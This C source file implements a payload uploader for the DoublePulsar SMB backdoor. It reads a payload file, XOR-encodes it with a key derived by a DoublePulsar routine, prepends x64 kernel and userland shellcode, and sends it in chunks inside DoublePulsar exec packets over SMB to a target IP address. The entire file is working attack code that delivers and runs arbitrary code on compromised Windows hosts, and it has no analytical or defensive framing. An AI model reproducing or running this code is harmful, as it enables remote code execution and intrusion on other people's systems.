#define _GNU_SOURCE
#include "config.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    FILE *file = NULL;
    unsigned char *launcher = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    long file_length;
    size_t launcher_length;
    size_t payload_length;
    size_t template_length;
    size_t offset;
    size_t chunk_length;
    size_t packet_length;
    size_t part1_length = sizeof(KERNEL_SHELLCODE_X64_PART1);
    size_t part2_length = sizeof(KERNEL_SHELLCODE_X64_PART2);
    size_t userland_length = sizeof(USERLAND_SHELLCODE_X64);
    uint32_t process_hash = (uint32_t)payload_type;
    uint32_t xor_key;
    int result = -1;

    if (ip == NULL || payload_path == NULL)
        return -1;

    file = fopen(payload_path, "rb");
    if (file == NULL)
        goto cleanup;

    if (fseek(file, 0, SEEK_END) != 0)
        goto cleanup;
    file_length = ftell(file);
    if (file_length < 0 || fseek(file, 0, SEEK_SET) != 0)
        goto cleanup;

    launcher_length = (size_t)file_length;
    launcher = malloc(launcher_length == 0 ? 1 : launcher_length);
    if (launcher == NULL)
        goto cleanup;

    if (launcher_length != 0 &&
        fread(launcher, 1, launcher_length, file) != launcher_length)
        goto cleanup;

    if (fclose(file) != 0) {
        file = NULL;
        goto cleanup;
    }
    file = NULL;

    xor_key = DoublePulsarXORKeyCalculator(process_hash);
    xor_buffer(launcher, launcher_length, xor_key);

    payload_length = part1_length + sizeof(process_hash) + part2_length +
                     userland_length + launcher_length;
    payload = malloc(payload_length == 0 ? 1 : payload_length);
    if (payload == NULL)
        goto cleanup;

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1, part1_length);
    offset += part1_length;
    memcpy(payload + offset, &process_hash, sizeof(process_hash));
    offset += sizeof(process_hash);
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2, part2_length);
    offset += part2_length;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, userland_length);
    offset += userland_length;
    memcpy(payload + offset, launcher, launcher_length);

    template_length = sizeof(DP_EXEC_PKT);

    for (offset = 0; offset < payload_length; offset += chunk_length) {
        chunk_length = payload_length - offset;
        if (chunk_length > SMB_CHUNK_SIZE)
            chunk_length = SMB_CHUNK_SIZE;

        packet_length = template_length + chunk_length;
        packet = malloc(packet_length);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, template_length);
        memcpy(packet + template_length, payload + offset, chunk_length);

        if (smb_send(ip, port, packet, packet_length) != 0)
            goto cleanup;

        free(packet);
        packet = NULL;
    }

    result = 0;

cleanup:
    if (file != NULL)
        fclose(file);
    free(packet);
    free(payload);
    free(launcher);
    return result;
}